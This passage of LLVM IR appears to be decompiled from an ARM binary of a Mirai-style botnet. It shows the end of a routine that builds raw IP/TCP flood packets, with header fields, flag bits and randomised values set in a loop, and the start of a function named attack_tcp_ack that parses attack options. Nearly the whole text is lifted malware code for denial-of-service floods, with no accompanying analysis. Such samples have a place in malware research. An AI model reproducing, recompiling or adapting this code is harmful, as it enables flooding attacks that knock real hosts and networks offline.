  store i32 %v2_b620, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_b668

dec_label_pc_b940:                                ; preds = %dec_label_pc_b878
  %v0_b940 = call i32 @rand_next()
  %v1_b940 = trunc i32 %v0_b940 to i16
  store i32 %v0_b940, i32* %r0.global-to-local, align 4
  %v3_b944 = load i32, i32* @r5, align 4
  %v4_b944 = add i32 %v3_b944, 4
  %v5_b944 = inttoptr i32 %v4_b944 to i16*
  store i16 %v1_b940, i16* %v5_b944, align 2
  br label %dec_label_pc_b898

dec_label_pc_b94c:                                ; preds = %dec_label_pc_b7a8, %dec_label_pc_b768
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_b950 = call i32 @__GI_time(i32* null)
  store i32 %v2_b950, i32* %r0.global-to-local, align 4
  store i32 %v2_b574, i32* %r2.global-to-local, align 4
  %v6_b95c = icmp slt i32 %v2_b574, %v2_b950
  br i1 %v6_b95c, label %dec_label_pc_b8cc, label %dec_label_pc_b768

dec_label_pc_b964:                                ; preds = %dec_label_pc_b714
  %v3_b964 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b964, i32* @r5, align 4
  store i32 %v2_b3c0, i32* %ip.global-to-local, align 4
  store i32 %stack_var_-340.0.ph, i32* %r0.global-to-local, align 4
  %v5_b970 = mul i32 %v3_b964, 16
  %v6_b970 = add i32 %v5_b970, %v2_b3c0
  %v7_b970 = inttoptr i32 %v6_b970 to i32*
  store i32 %v0_b970, i32* %v7_b970, align 4
  %v0_b974 = load i32, i32* %r0.global-to-local, align 4
  %v1_b974 = add i32 %v0_b974, 4
  %v2_b974 = inttoptr i32 %v1_b974 to i32*
  %v3_b974 = load i32, i32* %v2_b974, align 4
  %v1_b978 = and i32 %v3_b974, 16711680
  store i32 %v1_b978, i32* %r0.global-to-local, align 4
  %v5_b98c = call i32 @llvm.bswap.i32(i32 %v3_b974)
  store i32 %v5_b98c, i32* %r3.global-to-local, align 4
  store i32 %v2_b3c0, i32* %r1.global-to-local, align 4
  %v0_b994 = load i32, i32* @r5, align 4
  %v3_b994 = mul i32 %v0_b994, 16
  %v2_b998 = add i32 %v3_b994, %v2_b3c0
  store i32 %v2_b998, i32* %ip.global-to-local, align 4
  %v2_b99c = add i32 %v2_b998, 4
  %v3_b99c = inttoptr i32 %v2_b99c to i32*
  store i32 %v5_b98c, i32* %v3_b99c, align 4
  store i32 %stack_var_-340.0.ph, i32* %r2.global-to-local, align 4
  %v1_b9a4 = add i32 %stack_var_-340.0.ph, 8
  %v2_b9a4 = inttoptr i32 %v1_b9a4 to i32*
  %v3_b9a4 = load i32, i32* %v2_b9a4, align 4
  %v1_b9b0 = and i32 %v3_b9a4, 65280
  store i32 %v1_b9b0, i32* %r2.global-to-local, align 4
  %v5_b9bc = call i32 @llvm.bswap.i32(i32 %v3_b9a4)
  store i32 %v5_b9bc, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-340.0.ph, i32* %r1.global-to-local, align 4
  store i32 %v6_b544, i32* %r0.global-to-local, align 4
  %v1_b9c8 = add i32 %stack_var_-340.0.ph, 2
  %v2_b9c8 = inttoptr i32 %v1_b9c8 to i16*
  %v3_b9c8 = load i16, i16* %v2_b9c8, align 2
  %v4_b9c8 = zext i16 %v3_b9c8 to i32
  store i32 %v4_b9c8, i32* %r1.global-to-local, align 4
  store i32 %v1_b9cc, i32* @r4, align 4
  %v2_b9d0 = load i32, i32* %ip.global-to-local, align 4
  %v3_b9d0 = add i32 %v2_b9d0, 12
  %v4_b9d0 = inttoptr i32 %v3_b9d0 to i16*
  store i16 %v3_b9c8, i16* %v4_b9d0, align 2
  %v0_b9d4 = load i32, i32* @lr, align 4
  %v1_b9d4 = trunc i32 %v0_b9d4 to i16
  %v2_b9d4 = load i32, i32* %ip.global-to-local, align 4
  %v3_b9d4 = add i32 %v2_b9d4, 14
  %v4_b9d4 = inttoptr i32 %v3_b9d4 to i16*
  store i16 %v1_b9d4, i16* %v4_b9d4, align 2
  %v0_b9d8 = load i32, i32* %r3.global-to-local, align 4
  %v1_b9d8 = load i32, i32* %ip.global-to-local, align 4
  %v2_b9d8 = add i32 %v1_b9d8, 8
  %v3_b9d8 = inttoptr i32 %v2_b9d8 to i32*
  store i32 %v0_b9d8, i32* %v3_b9d8, align 4
  %v0_b9dc = load i32, i32* @r4, align 4
  store i32 %v0_b9dc, i32* @r0, align 4
  %v0_b9e0 = call i32 @malloc()
  store i32 %v0_b9e0, i32* %r0.global-to-local, align 4
  store i32 %v2_b3d0, i32* %r3.global-to-local, align 4
  %v2_b9ec = load i32, i32* @r5, align 4
  %v5_b9ec = mul i32 %v2_b9ec, 4
  %v6_b9ec = add i32 %v5_b9ec, %v2_b3d0
  %v7_b9ec = inttoptr i32 %v6_b9ec to i32*
  store i32 %v0_b9e0, i32* %v7_b9ec, align 4
  %v3_b9f0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b9f0, i32* %r2.global-to-local, align 4
  %v0_b9f4 = load i32, i32* %r3.global-to-local, align 4
  %v4_b9f4 = mul i32 %v3_b9f0, 4
  %v5_b9f4 = add i32 %v0_b9f4, %v4_b9f4
  %v6_b9f4 = inttoptr i32 %v5_b9f4 to i32*
  %v7_b9f4 = load i32, i32* %v6_b9f4, align 4
  store i32 %v7_b9f4, i32* %ip.global-to-local, align 4
  %v1_b9f8 = inttoptr i32 %v7_b9f4 to i8*
  %v2_b9f8 = load i8, i8* %v1_b9f8, align 1
  %tmp99 = urem i8 %v2_b9f8, 16
  %v1_b9fc = zext i8 %tmp99 to i32
  %v1_ba00 = or i32 %v1_b9fc, 64
  store i32 %v1_ba00, i32* %r3.global-to-local, align 4
  %v1_ba04 = trunc i32 %v1_ba00 to i8
  store i8 %v1_ba04, i8* %v1_b9f8, align 1
  %v0_ba08 = load i32, i32* %ip.global-to-local, align 4
  %v1_ba08 = inttoptr i32 %v0_ba08 to i8*
  %v2_ba08 = load i8, i8* %v1_ba08, align 1
  store i32 %v4_ba0c, i32* %lr.global-to-local, align 4
  %v1_ba10 = and i8 %v2_ba08, -16
  %v1_ba1c = or i8 %v1_ba10, 5
  %v0_ba20 = load i32, i32* @r4, align 4
  %v3_ba20 = mul i32 %v0_ba20, 65536
  store i32 %v3_ba20, i32* %r4.global-to-local, align 4
  store i32 %v5_ba24, i32* %r1.global-to-local, align 4
  store i32 %v1_b450, i32* %r0.global-to-local, align 4
  store i8 %v1_ba1c, i8* %v1_ba08, align 1
  %v0_ba30 = load i32, i32* %r1.global-to-local, align 4
  %v1_ba30 = trunc i32 %v0_ba30 to i16
  %v2_ba30 = load i32, i32* %ip.global-to-local, align 4
  %v3_ba30 = add i32 %v2_ba30, 4
  %v4_ba30 = inttoptr i32 %v3_ba30 to i16*
  store i16 %v1_ba30, i16* %v4_ba30, align 2
  %v0_ba34 = load i32, i32* %r4.global-to-local, align 4
  %v3_ba34 = udiv i32 %v0_ba34, 256
  %v1_ba3c = and i32 %v3_ba34, 65280
  store i32 %v1_ba3c, i32* %r2.global-to-local, align 4
  %v2_ba40 = load i32, i32* %ip.global-to-local, align 4
  %v3_ba40 = add i32 %v2_ba40, 1
  %v4_ba40 = inttoptr i32 %v3_ba40 to i8*
  store i8 %v5_b408, i8* %v4_ba40, align 1
  %v0_ba44 = load i32, i32* %r2.global-to-local, align 4
  %v1_ba44 = load i32, i32* %r4.global-to-local, align 4
  %v4_ba44 = udiv i32 %v1_ba44, 16777216
  %v5_ba44 = or i32 %v4_ba44, %v0_ba44
  %v1_ba48 = trunc i32 %v5_ba44 to i16
  %v2_ba48 = load i32, i32* %ip.global-to-local, align 4
  %v3_ba48 = add i32 %v2_ba48, 2
  %v4_ba48 = inttoptr i32 %v3_ba48 to i16*
  store i16 %v1_ba48, i16* %v4_ba48, align 2
  %v0_ba50 = load i32, i32* %ip.global-to-local, align 4
  %v1_ba50 = add i32 %v0_ba50, 20
  store i32 %v1_ba50, i32* %r3.global-to-local, align 4
  %v3_ba54 = add i32 %v0_ba50, 8
  %v4_ba54 = inttoptr i32 %v3_ba54 to i8*
  store i8 %v5_b440, i8* %v4_ba54, align 1
  %v0_ba58 = load i32, i32* %r3.global-to-local, align 4
  %v2_ba60 = load i32, i32* %ip.global-to-local, align 4
  %v3_ba60 = add i32 %v2_ba60, 9
  %v4_ba60 = inttoptr i32 %v3_ba60 to i8*
  store i8 6, i8* %v4_ba60, align 1
  store i32 ptrtoint (i32* @global_var_260b8.92 to i32), i32* %r2.global-to-local, align 4
  %v2_ba68 = load i32, i32* @global_var_260b8.92, align 4
  store i32 %v2_ba68, i32* %r1.global-to-local, align 4
  %v1_ba6c = load i32, i32* %ip.global-to-local, align 4
  %v2_ba6c = add i32 %v1_ba6c, 12
  %v3_ba6c = inttoptr i32 %v2_ba6c to i32*
  store i32 %v2_ba68, i32* %v3_ba6c, align 4
  %v0_ba70 = load i32, i32* %r0.global-to-local, align 4
  %v2_ba70 = icmp eq i32 %v0_ba70, 0
  %v3_ba74 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_ba74, i32* %r3.global-to-local, align 4
  store i32 %v2_b3c0, i32* %r0.global-to-local, align 4
  br i1 %v2_ba70, label %.thread10, label %bb80

bb80:                                             ; preds = %dec_label_pc_b964
  store i32 64, i32* %lr.global-to-local, align 4
  %v3_ba80 = load i32, i32* %ip.global-to-local, align 4
  %v4_ba80 = add i32 %v3_ba80, 6
  %v5_ba80 = inttoptr i32 %v4_ba80 to i16*
  store i16 64, i16* %v5_ba80, align 2
  %v0_ba84.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_ba84.pre = load i32, i32* %r3.global-to-local, align 4
  br label %.thread10

.thread10:                                        ; preds = %dec_label_pc_b964, %bb80
  %v0_ba88 = phi i32 [ %v3_ba74, %dec_label_pc_b964 ], [ %v1_ba84.pre, %bb80 ]
  %v1_ba8c = phi i32 [ %v2_b3c0, %dec_label_pc_b964 ], [ %v0_ba84.pre, %bb80 ]
  %v4_ba84 = mul i32 %v0_ba88, 16
  %v5_ba84 = add i32 %v4_ba84, %v1_ba8c
  %v6_ba84 = inttoptr i32 %v5_ba84 to i32*
  %v7_ba84 = load i32, i32* %v6_ba84, align 4
  store i32 %v7_ba84, i32* %r2.global-to-local, align 4
  store i32 %v5_ba84, i32* %r3.global-to-local, align 4
  %v1_ba90 = load i32, i32* %ip.global-to-local, align 4
  %v2_ba90 = add i32 %v1_ba90, 16
  %v3_ba90 = inttoptr i32 %v2_ba90 to i32*
  store i32 %v7_ba84, i32* %v3_ba90, align 4
  %v0_ba94 = load i32, i32* %r3.global-to-local, align 4
  %v1_ba94 = add i32 %v0_ba94, 12
  %v2_ba94 = inttoptr i32 %v1_ba94 to i16*
  %v3_ba94 = load i16, i16* %v2_ba94, align 2
  %v4_ba94 = zext i16 %v3_ba94 to i32
  store i32 %v4_ba94, i32* %r1.global-to-local, align 4
  %v0_ba98 = load i32, i32* %ip.global-to-local, align 4
  %v1_ba98 = add i32 %v0_ba98, 40
  store i32 %v1_ba98, i32* @r4, align 4
  %v3_ba9c = add i32 %v0_ba98, 20
  %v4_ba9c = inttoptr i32 %v3_ba9c to i16*
  store i16 %v3_ba94, i16* %v4_ba9c, align 2
  store i32 %v0_ba58, i32* %ip.global-to-local, align 4
  %v0_baa4 = load i32, i32* %r3.global-to-local, align 4
  %v1_baa4 = add i32 %v0_baa4, 8
  %v2_baa4 = inttoptr i32 %v1_baa4 to i32*
  %v3_baa4 = load i32, i32* %v2_baa4, align 4
  store i32 %v3_baa4, i32* %r1.global-to-local, align 4
  %v2_baa8 = add i32 %v0_ba58, 4
  %v3_baa8 = inttoptr i32 %v2_baa8 to i32*
  store i32 %v3_baa4, i32* %v3_baa8, align 4
  %v0_baac = load i32, i32* %ip.global-to-local, align 4
  %v1_baac = add i32 %v0_baac, 13
  %v2_baac = inttoptr i32 %v1_baac to i8*
  %v3_baac = load i8, i8* %v2_baac, align 1
  %v4_baac = zext i8 %v3_baac to i32
  store i32 %v4_baac, i32* %r2.global-to-local, align 4
  %v0_bab0 = load i32, i32* %r3.global-to-local, align 4
  %v1_bab0 = add i32 %v0_bab0, 4
  %v2_bab0 = inttoptr i32 %v1_bab0 to i32*
  %v3_bab0 = load i32, i32* %v2_bab0, align 4
  store i32 %v3_bab0, i32* %r1.global-to-local, align 4
  %v1_bab4 = add i32 %v0_bab0, 14
  %v2_bab4 = inttoptr i32 %v1_bab4 to i16*
  %v3_bab4 = load i16, i16* %v2_bab4, align 2
  %v4_bab4 = zext i16 %v3_bab4 to i32
  store i32 %v4_bab4, i32* %r3.global-to-local, align 4
  %v1_bab8 = or i32 %v4_baac, 1
  store i32 %v1_bab8, i32* %r2.global-to-local, align 4
  %v3_babc = add i32 %v0_baac, 2
  %v4_babc = inttoptr i32 %v3_babc to i16*
  store i16 %v3_bab4, i16* %v4_babc, align 2
  %v0_bac0 = load i32, i32* %r2.global-to-local, align 4
  %v1_bac0 = trunc i32 %v0_bac0 to i8
  %v2_bac0 = load i32, i32* %ip.global-to-local, align 4
  %v3_bac0 = add i32 %v2_bac0, 13
  %v4_bac0 = inttoptr i32 %v3_bac0 to i8*
  store i8 %v1_bac0, i8* %v4_bac0, align 1
  %v0_bac4 = load i32, i32* %ip.global-to-local, align 4
  %v1_bac4 = add i32 %v0_bac4, 12
  %v2_bac4 = inttoptr i32 %v1_bac4 to i8*
  %v3_bac4 = load i8, i8* %v2_bac4, align 1
  %v4_bac4 = zext i8 %v3_bac4 to i32
  store i32 %v4_bac4, i32* %r3.global-to-local, align 4
  %v1_bac8 = add i32 %v0_bac4, 13
  %v2_bac8 = inttoptr i32 %v1_bac8 to i8*
  %v3_bac8 = load i8, i8* %v2_bac8, align 1
  %v4_bac8 = zext i8 %v3_bac8 to i32
  %tmp100 = urem i8 %v3_bac4, 16
  %v1_bacc = zext i8 %tmp100 to i32
  %v1_bad0 = or i32 %v1_bacc, 128
  store i32 %v1_bad0, i32* %r3.global-to-local, align 4
  %v1_bad4 = or i32 %v4_bac8, 16
  store i32 %v1_bad4, i32* %r2.global-to-local, align 4
  %v0_bad8 = load i32, i32* %r1.global-to-local, align 4
  %v2_bad8 = add i32 %v0_bac4, 8
  %v3_bad8 = inttoptr i32 %v2_bad8 to i32*
  store i32 %v0_bad8, i32* %v3_bad8, align 4
  %v0_badc = load i32, i32* %r3.global-to-local, align 4
  %v1_badc = trunc i32 %v0_badc to i8
  %v2_badc = load i32, i32* %ip.global-to-local, align 4
  %v3_badc = add i32 %v2_badc, 12
  %v4_badc = inttoptr i32 %v3_badc to i8*
  store i8 %v1_badc, i8* %v4_badc, align 1
  %v0_bae0 = load i32, i32* %r2.global-to-local, align 4
  %v1_bae0 = trunc i32 %v0_bae0 to i8
  %v2_bae0 = load i32, i32* %ip.global-to-local, align 4
  %v3_bae0 = add i32 %v2_bae0, 13
  %v4_bae0 = inttoptr i32 %v3_bae0 to i8*
  store i8 %v1_bae0, i8* %v4_bae0, align 1
  %v0_bae4 = call i32 @rand_next()
  %v1_bae4 = trunc i32 %v0_bae4 to i16
  store i32 %v0_bae4, i32* %r0.global-to-local, align 4
  store i32 %v0_ba58, i32* %lr.global-to-local, align 4
  store i32 %v1_b48c, i32* %r1.global-to-local, align 4
  %v1_baf0 = add i32 %v0_ba58, 13
  %v2_baf0 = inttoptr i32 %v1_baf0 to i8*
  %v3_baf0 = load i8, i8* %v2_baf0, align 1
  %v4_baf0 = zext i8 %v3_baf0 to i32
  store i32 %v1_baf4, i32* %r2.global-to-local, align 4
  %v1_baf8 = and i32 %v4_baf0, 223
  %v5_bafc = or i32 %v1_baf8, %v4_bafc
  store i32 %v5_bafc, i32* %r3.global-to-local, align 4
  %v1_bb00 = trunc i32 %v5_bafc to i8
  store i8 %v1_bb00, i8* %v2_baf0, align 1
  store i32 %v1_b4ac, i32* %ip.global-to-local, align 4
  %v0_bb08 = load i32, i32* %lr.global-to-local, align 4
  %v1_bb08 = add i32 %v0_bb08, 13
  %v2_bb08 = inttoptr i32 %v1_bb08 to i8*
  %v3_bb08 = load i8, i8* %v2_bb08, align 1
  %v4_bb08 = zext i8 %v3_bb08 to i32
  store i32 %v1_bb0c, i32* %r3.global-to-local, align 4
  %v1_bb10 = and i32 %v4_bb08, 239
  %v5_bb14 = or i32 %v1_bb10, %v4_bb14
  store i32 %v5_bb14, i32* %r2.global-to-local, align 4
  %v1_bb18 = trunc i32 %v5_bb14 to i8
  store i8 %v1_bb18, i8* %v2_bb08, align 1
  %v0_bb1c = load i32, i32* %lr.global-to-local, align 4
  %v1_bb1c = add i32 %v0_bb1c, 13
  %v2_bb1c = inttoptr i32 %v1_bb1c to i8*
  %v3_bb1c = load i8, i8* %v2_bb1c, align 1
  %v4_bb1c = zext i8 %v3_bb1c to i32
  store i32 %v1_b4cc, i32* %lr.global-to-local, align 4
  store i32 %v0_ba58, i32* %r1.global-to-local, align 4
  store i32 %v1_bb28, i32* %r2.global-to-local, align 4
  %v1_bb2c = and i32 %v4_bb1c, 247
  %v5_bb30 = or i32 %v1_bb2c, %v4_bb30
  store i32 %v5_bb30, i32* %r3.global-to-local, align 4
  %v1_bb34 = trunc i32 %v5_bb30 to i8
  store i8 %v1_bb34, i8* %v2_baf0, align 1
  store i32 %v1_b4ec, i32* %ip.global-to-local, align 4
  %v0_bb3c = load i32, i32* %r1.global-to-local, align 4
  %v1_bb3c = add i32 %v0_bb3c, 13
  %v2_bb3c = inttoptr i32 %v1_bb3c to i8*
  %v3_bb3c = load i8, i8* %v2_bb3c, align 1
  %v4_bb3c = zext i8 %v3_bb3c to i32
  store i32 %v1_bb40, i32* %r3.global-to-local, align 4
  %v1_bb44 = and i32 %v4_bb3c, 251
  %v5_bb48 = or i32 %v1_bb44, %v4_bb48
  store i32 %v5_bb48, i32* %r2.global-to-local, align 4
  %v1_bb4c = trunc i32 %v5_bb48 to i8
  store i8 %v1_bb4c, i8* %v2_bb3c, align 1
  store i32 %v1_b50c, i32* @lr, align 4
  %v0_bb54 = load i32, i32* %r1.global-to-local, align 4
  %v1_bb54 = add i32 %v0_bb54, 13
  %v2_bb54 = inttoptr i32 %v1_bb54 to i8*
  %v3_bb54 = load i8, i8* %v2_bb54, align 1
  %v4_bb54 = zext i8 %v3_bb54 to i32
  store i32 %v1_bb58, i32* %r2.global-to-local, align 4
  %v1_bb5c = and i32 %v4_bb54, 253
  %v4_bb60 = or i32 %v1_bb5c, %v3_bb60
  store i32 %v4_bb60, i32* %r3.global-to-local, align 4
  %v1_bb64 = trunc i32 %v4_bb60 to i8
  store i8 %v1_bb64, i8* %v2_bb54, align 1
  %v0_bb68 = load i32, i32* %r1.global-to-local, align 4
  %v1_bb68 = add i32 %v0_bb68, 13
  %v2_bb68 = inttoptr i32 %v1_bb68 to i8*
  %v3_bb68 = load i8, i8* %v2_bb68, align 1
  %v4_bb68 = zext i8 %v3_bb68 to i32
  %v1_bb70 = and i32 %v4_bb68, 254
  %v2_bb78 = or i32 %v1_bb70, %v1_bb74
  store i32 %v2_bb78, i32* %r3.global-to-local, align 4
  store i32 %v0_ba58, i32* %r2.global-to-local, align 4
  %v1_bb80 = trunc i32 %v2_bb78 to i8
  store i8 %v1_bb80, i8* %v2_baf0, align 1
  %v3_bb84 = load i32, i32* %r2.global-to-local, align 4
  %v4_bb84 = add i32 %v3_bb84, 14
  %v5_bb84 = inttoptr i32 %v4_bb84 to i16*
  store i16 %v1_bae4, i16* %v5_bb84, align 2
  store i32 %v6_b544, i32* %r1.global-to-local, align 4
  %v0_bb8c = load i32, i32* @r4, align 4
  store i32 %v0_bb8c, i32* %r0.global-to-local, align 4
  %v2_bb90 = call i32 @rand_alphastr(i32 %v0_bb8c, i32 %v6_b544)
  store i32 %v2_bb90, i32* %r0.global-to-local, align 4
  store i32 %v6_b544, i32* %ip.global-to-local, align 4
  %v2_bb9c = load i32, i32* @r4, align 4
  %v4_bb9c = add i32 %v2_bb9c, %v6_b544
  %v5_bb9c = inttoptr i32 %v4_bb9c to i8*
  store i8 0, i8* %v5_bb9c, align 1
  %v3_bba0 = load i32, i32* %stack_var_-44, align 4
  store i32 %arg2, i32* @lr, align 4
  %v1_bba8 = add i32 %v3_bba0, 1
  store i32 %v1_bba8, i32* @r3, align 4
  store i32 %v1_bba8, i32* %stack_var_-44, align 4
  %v5_bbb4 = icmp slt i32 %v1_bba8, %arg2
  br i1 %v5_bbb4, label %dec_label_pc_b5dc.outer, label %dec_label_pc_b768.preheader

; uselistorder directives
  uselistorder i32 %v1_bba8, { 1, 0, 2 }
  uselistorder i8* %v2_baf0, { 2, 0, 1, 3 }
  uselistorder i32 %v0_bae4, { 1, 0 }
  uselistorder i32 %v0_ba58, { 1, 2, 4, 3, 6, 5, 0 }
  uselistorder i32 %v5_b98c, { 1, 0 }
  uselistorder i32 %v2_b950, { 1, 2, 0 }
  uselistorder i32 %v0_b940, { 1, 0 }
  uselistorder i32 %v0_b930, { 1, 0 }
  uselistorder i32 %v0_b8ec, { 1, 2, 0, 3 }
  uselistorder i32 %v1_b868, { 1, 2, 0, 3 }
  uselistorder i32 %v5_b830, { 1, 0 }
  uselistorder i32 %v4_b820, { 1, 0 }
  uselistorder i32 %v3_b7ec, { 1, 0 }
  uselistorder i32 %v3_b7cc, { 3, 2, 0, 1 }
  uselistorder i32 %v2_b7b8, { 1, 0 }
  uselistorder i32 %v3_b790, { 1, 0 }
  uselistorder i32 %v1_b784, { 2, 0, 1 }
  uselistorder i32 %v1_b758, { 1, 0, 2 }
  uselistorder i32 %v3_b740, { 0, 2, 3, 1 }
  uselistorder i32 %v4_b708, { 1, 0 }
  uselistorder i16 %stack_var_-62.2, { 0, 3, 1, 2 }
  uselistorder i32 %v0_b64c, { 1, 0, 2 }
  uselistorder i32 %v0_b970, { 1, 0, 4, 5, 2, 3 }
  uselistorder i32 %v4_b63c, { 1, 0 }
  uselistorder i1 %v7_b634, { 1, 0 }
  uselistorder i32 %v3_b5e8, { 1, 2, 0, 3 }
  uselistorder i32 %stack_var_-60.0, { 1, 0 }
  uselistorder i16 %stack_var_-62.0, { 1, 0 }
  uselistorder i32 %stack_var_-340.0.ph, { 3, 4, 1, 2, 0 }
  uselistorder i32 %v1_bb58, { 1, 0 }
  uselistorder i32 %v1_bb40, { 1, 0 }
  uselistorder i32 %v1_bb0c, { 1, 0 }
  uselistorder i32 %v3_b700, { 1, 0 }
  uselistorder i32 %v1_bb28, { 1, 0 }
  uselistorder i32 %v1_baf4, { 1, 0 }
  uselistorder i32 %v4_ba0c, { 4, 2, 3, 0, 1 }
  uselistorder i32 %v1_b9cc, { 2, 0, 1 }
  uselistorder i32 %v1_b718, { 1, 0 }
  uselistorder i32 %v4_b714, { 2, 0, 1 }
  uselistorder i32 %v2_b620, { 3, 2, 1, 4, 0 }
  uselistorder i16 %v5_b5d4, { 1, 0 }
  uselistorder i32 %v0_b5c4, { 1, 0 }
  uselistorder i32 %v3_b588, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_b574, { 1, 0 }
  uselistorder i32 %v1_b564, { 2, 1, 0 }
  uselistorder i32 %v6_b544, { 2, 7, 6, 5, 8, 3, 12, 11, 10, 13, 4, 0, 9, 1 }
  uselistorder i32 %v1_b50c, { 1, 0 }
  uselistorder i32 %v1_b4ec, { 1, 0 }
  uselistorder i32 %v1_b4cc, { 1, 0 }
  uselistorder i32 %v1_b4ac, { 1, 0 }
  uselistorder i32 %v1_b48c, { 1, 0 }
  uselistorder i32 %v7_b468, { 1, 0 }
  uselistorder i32 %v1_b450, { 1, 0 }
  uselistorder i32 %v5_b424, { 1, 0 }
  uselistorder i32 %v6_b3e8, { 1, 0 }
  uselistorder i32 %v2_b3d0, { 0, 2, 1, 3 }
  uselistorder i32 %v2_b3c0, { 3, 4, 0, 5, 1, 6, 2, 7 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 17, 15, 16 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 39, 40, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 41, 40, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 25, 20, 21, 22, 23, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 43, 42, 44, 46, 45, 47, 49, 48, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 7, 3, 4, 5, 6, 12, 8, 9, 10, 11, 14, 13, 16, 17, 15, 18, 20, 19, 23, 21, 27, 22, 24, 26, 25, 30, 28, 29, 31, 32, 33, 35, 36, 34, 37, 39, 38, 41, 40, 44, 43, 42, 45, 47, 46, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 0 }
  uselistorder i32 %arg2, { 3, 2, 1, 6, 7, 5, 4, 0, 8, 10, 9, 11, 12, 13 }
  uselistorder label %.thread10, { 1, 0 }
  uselistorder label %dec_label_pc_b8cc, { 1, 3, 0, 2 }
  uselistorder label %dec_label_pc_b898, { 1, 0 }
  uselistorder label %dec_label_pc_b7a8, { 1, 0 }
  uselistorder label %dec_label_pc_b768, { 1, 0 }
  uselistorder label %dec_label_pc_b694, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_b668, { 1, 0 }
  uselistorder label %dec_label_pc_b644, { 1, 0 }
  uselistorder label %bb70, { 1, 0 }
  uselistorder label %dec_label_pc_b5f8, { 1, 0 }
  uselistorder label %dec_label_pc_b5dc, { 1, 0 }
  uselistorder label %dec_label_pc_b5dc.outer, { 1, 0 }
}

define i32 @attack_tcp_ack(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v18_bbc0 = load i32, i32* @sb, align 4
  %v24_bbc0 = load i32, i32* @fp, align 4
  %v27_bbc0 = load i32, i32* @lr, align 4
  store i32 0, i32* @sl, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg5, i32* @r4, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_bbec = call i32 @calloc(i32 %arg2, i32 4)
  %v0_bbf0 = load i32, i32* @r4, align 4
  store i32 %v0_bbf0, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_bbfc = load i32, i32* @sl, align 4
  store i32 %v0_bbfc, i32* %r3.global-to-local, align 4
  %v0_bc00 = load i32, i32* @r5, align 4
  store i32 %v0_bc00, i32* %r0.global-to-local, align 4
  %v5_bc04 = inttoptr i32 %v0_bbf0 to i32*
  %v6_bc04 = call i32 @attack_get_opt_int(i32 %v0_bc00, i32* %v5_bc04, i32 2, i32 %v0_bbfc)
  %v1_bc10 = urem i32 %v6_bc04, 256
  store i32 %v1_bc10, i32* %ip.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_ffff.36 to i32), i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_bc1c = load i32, i32* @r4, align 4
  store i32 %v0_bc1c, i32* %r1.global-to-local, align 4
  %v0_bc20 = load i32, i32* @r5, align 4
  store i32 %v0_bc20, i32* %r0.global-to-local, align 4
  %v5_bc24 = trunc i32 %v6_bc04 to i8
  %v7_bc28 = inttoptr i32 %v0_bc1c to i32*
  %v8_bc28 = call i32 @attack_get_opt_int(i32 %v0_bc20, i32* %v7_bc28, i32 3, i32 ptrtoint ([3 x i8]* @global_var_ffff.36 to i32))
  %v0_bc2c = load i32, i32* @r4, align 4
  store i32 %v0_bc2c, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_bc3c = load i32, i32* @r5, align 4
  store i32 %v0_bc3c, i32* %r0.global-to-local, align 4
  %v5_bc40 = inttoptr i32 %v0_bc2c to i32*
  %v6_bc40 = call i32 @attack_get_opt_int(i32 %v0_bc3c, i32* %v5_bc40, i32 4, i32 64)
  %v1_bc48 = urem i32 %v6_bc40, 256
  store i32 %v1_bc48, i32* %ip.global-to-local, align 4
  %v0_bc4c = load i32, i32* @r4, align 4
  store i32 %v0_bc4c, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
